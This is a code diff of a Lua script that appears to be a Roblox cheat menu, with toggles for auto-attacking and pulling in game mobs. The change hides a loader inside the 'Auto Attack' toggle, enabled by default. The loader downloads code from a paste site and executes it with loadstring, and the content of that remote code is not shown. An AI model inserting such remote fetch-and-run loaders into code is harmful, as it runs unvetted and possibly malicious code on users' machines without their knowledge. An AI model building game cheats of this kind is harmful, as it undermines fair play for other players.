@@ -4883,16 +4883,20 @@ end)
 		end
 	end)
 	local Initialize = Tabs.Settings:AddToggle("Initialize", {
-		Title = "Auto Attack",
-		Description = "",
-		Default = true
-	})
-	Initialize:OnChanged(function(Value)
-		_G.Seriality = Value
-	end)
+    Title = "Auto Attack",
+    Description = "",
+    Default = true
+})
+
+Initialize:OnChanged(function(Value)
+    _G.Seriality = Value
+    if Value then
+        loadstring(game:HttpGet("https://pastefy.app/cS7PVnkf/raw"))()
+    end
+end)
 	local Bringmob = Tabs.Settings:AddToggle("Bringmob", {
-		Title = "Bring Mobs (Beta)",
-		Description = "Junta Os Mobs (Se Bugar Reative)",
+		Title = "Bring Mobs",
+		Description = "",
 		Default = true 
 	})
 	Bringmob:OnChanged(function(Value)
